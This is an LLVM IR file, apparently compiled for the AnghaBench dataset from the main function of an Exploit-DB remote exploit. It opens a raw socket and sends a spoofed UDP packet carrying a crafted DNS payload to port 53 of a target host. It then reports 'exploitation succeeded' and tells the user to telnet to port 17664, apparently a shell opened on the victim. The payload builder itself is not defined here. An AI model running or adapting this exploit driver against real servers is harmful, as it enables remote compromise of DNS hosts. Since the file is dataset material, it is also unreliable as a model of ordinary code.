; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19918.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19918.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [34 x i8] c"usage: %s <source ip> <dest ip>\0A\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"libnet_open_raw_sock\00", align 1
@UDP_H = common dso_local global i32 0, align 4
@DNS_H = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@PRu16 = common dso_local global i32 0, align 4
@IP_H = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [25 x i8] c"exploitation succeeded.\0A\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"try: \22telnet %s 17664\22 now.\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [2048 x i8], align 16
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 3
  br i1 %13, label %14, label %21

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = load i32, i32* @EXIT_FAILURE, align 4
  %20 = call i32 @exit(i32 %19) #3
  unreachable

21:                                               ; preds = %2
  %22 = load i32, i32* @IPPROTO_RAW, align 4
  %23 = call i32 @libnet_open_raw_sock(i32 %22)
  store i32 %23, i32* %6, align 4
  %24 = load i32, i32* %6, align 4
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %30

26:                                               ; preds = %21
  %27 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %28 = load i32, i32* @EXIT_FAILURE, align 4
  %29 = call i32 @exit(i32 %28) #3
  unreachable

30:                                               ; preds = %21
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @libnet_name_resolve(i8* %33, i32 0)
  store i32 %34, i32* %7, align 4
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @libnet_name_resolve(i8* %37, i32 0)
  store i32 %38, i32* %8, align 4
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %40 = call i32 @build_xp(i8* %39)
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* @UDP_H, align 4
  %42 = load i32, i32* @DNS_H, align 4
  %43 = add nsw i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = add i32 %43, %44
  %46 = load i32, i32* @IPPROTO_UDP, align 4
  %47 = load i32, i32* %7, align 4
  %48 = load i32, i32* %8, align 4
  %49 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %50 = call i32 @libnet_build_ip(i32 %45, i32 0, i32 7350, i32 0, i32 2, i32 %46, i32 %47, i32 %48, i32* null, i32 0, i8* %49)
  %51 = load i32, i32* @PRu16, align 4
  %52 = call i32 @libnet_get_prand(i32 %51)
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %54 = load i32, i32* @IP_H, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = call i32 @libnet_build_udp(i32 %52, i32 53, i32* null, i32 0, i8* %56)
  %58 = load i32, i32* @PRu16, align 4
  %59 = call i32 @libnet_get_prand(i32 %58)
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %61 = load i32, i32* %11, align 4
  %62 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %63 = load i32, i32* @IP_H, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  %66 = load i32, i32* @UDP_H, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @libnet_build_dns(i32 %59, i32 0, i32 1, i32 0, i32 0, i32 0, i8* %60, i32 %61, i8* %68)
  %70 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %71 = load i32, i32* @IPPROTO_UDP, align 4
  %72 = load i32, i32* @UDP_H, align 4
  %73 = load i32, i32* @DNS_H, align 4
  %74 = add nsw i32 %72, %73
  %75 = load i32, i32* %11, align 4
  %76 = add i32 %74, %75
  %77 = call i32 @libnet_do_checksum(i8* %70, i32 %71, i32 %76)
  %78 = load i32, i32* %6, align 4
  %79 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  %80 = load i32, i32* @UDP_H, align 4
  %81 = load i32, i32* @IP_H, align 4
  %82 = add nsw i32 %80, %81
  %83 = load i32, i32* @DNS_H, align 4
  %84 = add nsw i32 %82, %83
  %85 = load i32, i32* %11, align 4
  %86 = add i32 %84, %85
  %87 = call i32 @libnet_write_ip(i32 %78, i8* %79, i32 %86)
  %88 = load i32, i32* %6, align 4
  %89 = call i32 @libnet_close_raw_sock(i32 %88)
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 2
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i8* %93)
  %95 = load i32, i32* @EXIT_SUCCESS, align 4
  %96 = call i32 @exit(i32 %95) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @libnet_open_raw_sock(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @libnet_name_resolve(i8*, i32) #1

declare dso_local i32 @build_xp(i8*) #1

declare dso_local i32 @libnet_build_ip(i32, i32, i32, i32, i32, i32, i32, i32, i32*, i32, i8*) #1

declare dso_local i32 @libnet_build_udp(i32, i32, i32*, i32, i8*) #1

declare dso_local i32 @libnet_get_prand(i32) #1

declare dso_local i32 @libnet_build_dns(i32, i32, i32, i32, i32, i32, i8*, i32, i8*) #1

declare dso_local i32 @libnet_do_checksum(i8*, i32, i32) #1

declare dso_local i32 @libnet_write_ip(i32, i8*, i32) #1

declare dso_local i32 @libnet_close_raw_sock(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
